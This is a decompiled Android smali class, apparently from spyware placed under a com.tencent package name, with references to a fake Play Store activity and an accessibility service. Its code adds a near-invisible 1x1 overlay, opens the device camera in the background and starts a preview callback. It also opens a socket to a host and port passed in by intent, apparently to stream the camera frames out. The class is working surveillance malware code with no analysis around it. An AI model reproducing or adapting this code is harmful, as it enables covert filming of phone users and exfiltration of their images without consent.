.class public Lcom/tencent/SecondaryBackgroundService;
.super Landroid/app/Service;
.source "tunesxconcerningn106.java"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# static fields
.field public static c_tunesxconcerningn106_m:Landroid/hardware/Camera;

.field public static la_tunesxconcerningn106_y:Landroid/view/WindowManager$LayoutParams;

.field public static o_tunesxconcerningn106_ut:Ljava/io/OutputStream;

.field public static s_tunesxconcerningn106_fw:Landroid/view/SurfaceView;

.field public static s_tunesxconcerningn106_k:Ljava/net/Socket;

.field static st:Lcom/tencent/SecondaryBackgroundService;

.field private static syc:Ljava/lang/Object;

.field public static w_tunesxconcerningn106_m:Landroid/view/WindowManager;


# instance fields
.field public Lo:Z

.field private b_tunesxconcerningn106_ts:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field public ctd:Z

.field private q4:I

.field public usd:Z

.field private vul:[Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 40
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/tencent/SecondaryBackgroundService;->syc:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 31
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 38
    iput-boolean v0, p0, Lcom/tencent/SecondaryBackgroundService;->usd:Z

    iput-boolean v0, p0, Lcom/tencent/SecondaryBackgroundService;->ctd:Z

    iput-boolean v0, p0, Lcom/tencent/SecondaryBackgroundService;->Lo:Z

    .line 39
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/tencent/SecondaryBackgroundService;->b_tunesxconcerningn106_ts:Ljava/util/List;

    const/16 v0, 0x32

    .line 42
    iput v0, p0, Lcom/tencent/SecondaryBackgroundService;->q4:I

    return-void
.end method

.method static synthetic access$000(Lcom/tencent/SecondaryBackgroundService;)V
    .locals 0

    .line 31
    invoke-direct {p0}, Lcom/tencent/SecondaryBackgroundService;->di()V

    return-void
.end method

.method static synthetic access$100()Ljava/lang/Object;
    .locals 1

    .line 31
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->syc:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic access$200(Lcom/tencent/SecondaryBackgroundService;)Ljava/util/List;
    .locals 0

    .line 31
    iget-object p0, p0, Lcom/tencent/SecondaryBackgroundService;->b_tunesxconcerningn106_ts:Ljava/util/List;

    return-object p0
.end method

.method static synthetic access$300(Lcom/tencent/SecondaryBackgroundService;)[Ljava/lang/String;
    .locals 0

    .line 31
    iget-object p0, p0, Lcom/tencent/SecondaryBackgroundService;->vul:[Ljava/lang/String;

    return-object p0
.end method

.method static synthetic access$400(Lcom/tencent/SecondaryBackgroundService;)I
    .locals 0

    .line 31
    iget p0, p0, Lcom/tencent/SecondaryBackgroundService;->q4:I

    return p0
.end method

.method static synthetic access$402(Lcom/tencent/SecondaryBackgroundService;I)I
    .locals 0

    .line 31
    iput p1, p0, Lcom/tencent/SecondaryBackgroundService;->q4:I

    return p1
.end method

.method static synthetic access$500(Lcom/tencent/SecondaryBackgroundService;II)I
    .locals 0

    .line 31
    invoke-direct {p0, p1, p2}, Lcom/tencent/SecondaryBackgroundService;->q(II)I

    move-result p0

    return p0
.end method

.method private di()V
    .locals 1

    const/4 v0, 0x0

    .line 180
    iput-boolean v0, p0, Lcom/tencent/SecondaryBackgroundService;->Lo:Z

    .line 181
    sput-boolean v0, Lcom/tencent/MainBackgroundService;->F_tunesxconcerningn1011_ORCA:Z

    .line 182
    :try_start_0
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownOutput()V
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 189
    :catch_0
    :try_start_1
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownInput()V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 190
    :catch_1
    :try_start_2
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/net/SocketException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 191
    :catch_2
    :try_start_3
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3

    .line 192
    :catch_3
    :try_start_4
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/net/SocketException; {:try_start_4 .. :try_end_4} :catch_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_4

    .line 199
    :catch_4
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->o_tunesxconcerningn106_ut:Ljava/io/OutputStream;

    if-eqz v0, :cond_0

    .line 200
    :try_start_5
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_5

    :catch_5
    const/4 v0, 0x0

    .line 201
    sput-object v0, Lcom/tencent/SecondaryBackgroundService;->o_tunesxconcerningn106_ut:Ljava/io/OutputStream;

    :cond_0
    return-void
.end method

.method private q(II)I
    .locals 1

    const v0, 0xf000

    if-le p1, v0, :cond_0

    const/16 p2, 0xf

    goto :goto_0

    :cond_0
    const v0, 0xc800

    if-le p1, v0, :cond_1

    const/16 p2, 0x19

    goto :goto_0

    :cond_1
    const v0, 0xa000

    if-le p1, v0, :cond_2

    const/16 p2, 0x23

    goto :goto_0

    :cond_2
    const/16 v0, 0x7800

    if-le p1, v0, :cond_3

    const/16 p2, 0x2d

    goto :goto_0

    :cond_3
    const/16 v0, 0x5000

    if-le p1, v0, :cond_4

    const/16 p2, 0x41

    goto :goto_0

    :cond_4
    const/16 v0, 0x2800

    if-le p1, v0, :cond_5

    const/16 p2, 0x4b

    :cond_5
    :goto_0
    return p2
.end method


# virtual methods
.method public Completed_tunesxconcerningn106_App(Ljava/lang/String;I)V
    .locals 2

    .line 131
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/SecondaryBackgroundService$1;

    invoke-direct {v1, p0, p1, p2}, Lcom/tencent/SecondaryBackgroundService$1;-><init>(Lcom/tencent/SecondaryBackgroundService;Ljava/lang/String;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 177
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public c_tunesxconcerningn106_k()Z
    .locals 1

    .line 120
    :try_start_0
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v0, :cond_0

    .line 125
    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    :cond_0
    const/4 v0, 0x0

    return v0

    :catchall_0
    move-exception v0

    .line 127
    throw v0

    :catch_0
    const/4 v0, 0x1

    return v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 1

    .line 340
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    .line 341
    sput v0, Lcom/tencent/DataPackagingEngine;->s_tunesxconcerningn103_f1:I

    const/4 v0, 0x0

    .line 342
    sput-object v0, Lcom/tencent/SecondaryBackgroundService;->st:Lcom/tencent/SecondaryBackgroundService;

    .line 343
    invoke-virtual {p0}, Lcom/tencent/SecondaryBackgroundService;->sp()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 19

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    const/4 v2, 0x2

    .line 47
    :try_start_0
    new-instance v3, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Lcom/tencent/SecondaryBackgroundService;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Lcom/tencent/FakePlayStoreActivity;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "xyz"

    invoke-virtual {v3, v4}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    invoke-virtual {v0, v3}, Lcom/tencent/SecondaryBackgroundService;->sendBroadcast(Landroid/content/Intent;)V

    .line 49
    sget-object v3, Lcom/tencent/InstalledAppsScanner;->FTX1:Ljava/lang/String;

    const/4 v4, 0x1

    if-eqz v1, :cond_4

    .line 51
    invoke-virtual {v1, v3}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_4

    .line 55
    invoke-static {}, Lcom/tencent/DataPackagingEngine;->NeedSuper()Z

    move-result v5

    const/16 v6, 0x33

    if-eqz v5, :cond_1

    sget-object v5, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012wm:Landroid/view/WindowManager;

    if-eqz v5, :cond_1

    sget-object v5, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012lay:Landroid/view/WindowManager$LayoutParams;

    if-eqz v5, :cond_1

    .line 57
    invoke-virtual {v1, v3}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/tencent/SecondaryBackgroundService;->vul:[Ljava/lang/String;

    .line 58
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_k()Z

    move-result v1

    iput-boolean v1, v0, Lcom/tencent/SecondaryBackgroundService;->usd:Z

    if-nez v1, :cond_0

    .line 61
    new-instance v1, Landroid/view/SurfaceView;

    invoke-direct {v1, v0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_fw:Landroid/view/SurfaceView;

    .line 64
    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012lay:Landroid/view/WindowManager$LayoutParams;

    iput v6, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 65
    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012wm:Landroid/view/WindowManager;

    sget-object v3, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_fw:Landroid/view/SurfaceView;

    sget-object v5, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012lay:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v3, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 66
    sget-object v1, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_fw:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 67
    iget-object v1, v0, Lcom/tencent/SecondaryBackgroundService;->vul:[Ljava/lang/String;

    aget-object v3, v1, v4

    aget-object v1, v1, v2

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-virtual {v0, v3, v1}, Lcom/tencent/SecondaryBackgroundService;->Completed_tunesxconcerningn106_App(Ljava/lang/String;I)V

    goto/16 :goto_1

    .line 69
    :cond_0
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/SecondaryBackgroundService;->sp()V

    goto :goto_1

    .line 74
    :cond_1
    invoke-virtual {v1, v3}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/tencent/SecondaryBackgroundService;->vul:[Ljava/lang/String;

    .line 75
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_k()Z

    move-result v1

    iput-boolean v1, v0, Lcom/tencent/SecondaryBackgroundService;->usd:Z

    if-nez v1, :cond_3

    const-string v1, "window"

    .line 77
    invoke-virtual {v0, v1}, Lcom/tencent/SecondaryBackgroundService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    sput-object v1, Lcom/tencent/SecondaryBackgroundService;->w_tunesxconcerningn106_m:Landroid/view/WindowManager;

    .line 78
    new-instance v1, Landroid/view/SurfaceView;

    invoke-direct {v1, v0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_fw:Landroid/view/SurfaceView;

    .line 80
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    if-lt v1, v3, :cond_2

    .line 81
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v8, 0x1

    const/4 v9, 0x1

    const/16 v10, 0x7f6

    const/16 v11, 0x38

    const/4 v12, -0x3

    move-object v7, v1

    invoke-direct/range {v7 .. v12}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v1, Lcom/tencent/SecondaryBackgroundService;->la_tunesxconcerningn106_y:Landroid/view/WindowManager$LayoutParams;

    goto :goto_0

    .line 92
    :cond_2
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v14, 0x1

    const/4 v15, 0x1

    const/16 v16, 0x7d6

    const/high16 v17, 0x40000

    const/16 v18, -0x3

    move-object v13, v1

    invoke-direct/range {v13 .. v18}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v1, Lcom/tencent/SecondaryBackgroundService;->la_tunesxconcerningn106_y:Landroid/view/WindowManager$LayoutParams;

    .line 99
    :goto_0
    sget-object v1, Lcom/tencent/SecondaryBackgroundService;->la_tunesxconcerningn106_y:Landroid/view/WindowManager$LayoutParams;

    iput v6, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 100
    sget-object v1, Lcom/tencent/SecondaryBackgroundService;->w_tunesxconcerningn106_m:Landroid/view/WindowManager;

    sget-object v3, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_fw:Landroid/view/SurfaceView;

    sget-object v5, Lcom/tencent/SecondaryBackgroundService;->la_tunesxconcerningn106_y:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v3, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 101
    sget-object v1, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_fw:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 102
    iget-object v1, v0, Lcom/tencent/SecondaryBackgroundService;->vul:[Ljava/lang/String;

    aget-object v3, v1, v4

    aget-object v1, v1, v2

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-virtual {v0, v3, v1}, Lcom/tencent/SecondaryBackgroundService;->Completed_tunesxconcerningn106_App(Ljava/lang/String;I)V

    goto :goto_1

    .line 104
    :cond_3
    invoke-virtual/range {p0 .. p0}, Lcom/tencent/SecondaryBackgroundService;->sp()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_4
    :goto_1
    return v4

    :catch_0
    return v2
.end method

.method public p_tunesxconcerningn106_r()V
    .locals 2

    .line 273
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/SecondaryBackgroundService$3;

    invoke-direct {v1, p0}, Lcom/tencent/SecondaryBackgroundService$3;-><init>(Lcom/tencent/SecondaryBackgroundService;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 334
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public sp()V
    .locals 2

    .line 348
    :try_start_0
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    const/4 v1, 0x0

    .line 349
    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    .line 350
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 351
    sput-object v1, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    .line 353
    :cond_0
    invoke-direct {p0}, Lcom/tencent/SecondaryBackgroundService;->di()V

    .line 354
    iget-boolean v0, p0, Lcom/tencent/SecondaryBackgroundService;->usd:Z

    if-nez v0, :cond_1

    .line 355
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012wm:Landroid/view/WindowManager;

    sget-object v1, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_fw:Landroid/view/SurfaceView;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :cond_1
    const/4 v0, 0x0

    .line 357
    iput-boolean v0, p0, Lcom/tencent/SecondaryBackgroundService;->usd:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 361
    :catch_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/tencent/SecondaryBackgroundService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 362
    invoke-virtual {p0, v0}, Lcom/tencent/SecondaryBackgroundService;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    .line 249
    sget-object p1, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    if-eqz p1, :cond_0

    .line 250
    new-instance p2, Lcom/tencent/SecondaryBackgroundService$2;

    invoke-direct {p2, p0}, Lcom/tencent/SecondaryBackgroundService$2;-><init>(Lcom/tencent/SecondaryBackgroundService;)V

    invoke-virtual {p1, p2}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    :cond_0
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 7

    const-string v0, "continuous-video"

    .line 210
    :try_start_0
    iget-object v1, p0, Lcom/tencent/SecondaryBackgroundService;->vul:[Ljava/lang/String;

    const/4 v2, 0x0

    aget-object v1, v1, v2

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-static {v1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v1

    sput-object v1, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    .line 213
    :catch_0
    :try_start_1
    sget-object v1, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    invoke-virtual {v1}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v1

    .line 215
    sget-object v2, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v2

    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v2

    const/4 v3, 0x0

    if-eqz v2, :cond_1

    .line 216
    sget-object v2, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v2

    .line 217
    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v2

    .line 218
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_0
    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/hardware/Camera$Size;

    .line 219
    iget v5, v4, Landroid/hardware/Camera$Size;->width:I

    const/16 v6, 0x258

    if-le v5, v6, :cond_0

    iget v5, v4, Landroid/hardware/Camera$Size;->height:I

    const/16 v6, 0x190

    if-le v5, v6, :cond_0

    move-object v3, v4

    goto :goto_0

    :cond_1
    if-nez v3, :cond_2

    const/16 v2, 0x280

    .line 226
    iput v2, v3, Landroid/hardware/Camera$Size;->width:I

    const/16 v2, 0x1e0

    .line 227
    iput v2, v3, Landroid/hardware/Camera$Size;->height:I

    .line 229
    :cond_2
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService;->vul:[Ljava/lang/String;

    const/4 v4, 0x4

    aget-object v2, v2, v4

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    const/4 v4, 0x1

    if-ne v2, v4, :cond_3

    .line 230
    invoke-virtual {v1}, Landroid/hardware/Camera$Parameters;->getSupportedFocusModes()Ljava/util/List;

    move-result-object v2

    .line 231
    invoke-interface {v2, v0}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 232
    invoke-virtual {v1, v0}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V

    .line 235
    :cond_3
    iget v0, v3, Landroid/hardware/Camera$Size;->width:I

    iget v2, v3, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v1, v0, v2}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    const/16 v0, 0x11

    .line 236
    invoke-virtual {v1, v0}, Landroid/hardware/Camera$Parameters;->setPreviewFormat(I)V

    .line 237
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 238
    sget-object v0, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    invoke-virtual {v0, p1}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V

    .line 240
    sget-object p1, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method
